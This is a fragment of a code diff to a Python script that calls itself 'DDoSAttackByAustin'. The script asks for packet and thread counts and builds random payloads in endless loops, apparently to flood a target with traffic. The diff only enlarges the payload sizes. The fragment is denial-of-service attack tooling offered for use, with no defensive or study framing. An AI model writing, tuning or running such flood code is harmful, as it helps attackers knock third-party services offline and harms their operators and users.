@@ -24,7 +24,7 @@ choice = str(input(" DDoSAttackByAustin | Gas Gak Ni?(y/n):"))
 times = int(input(" DDoSAttackByAustin | Packets:"))
 threads = int(input(" DDoSAttackByAustin | Threads:"))
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(1124)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -37,7 +37,7 @@ def run():
 			print("[!] AUSTIN IS HERE DUDE! ")
 
 def run2():
-	data = random._urandom(16)
+	data = random._urandom(26)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
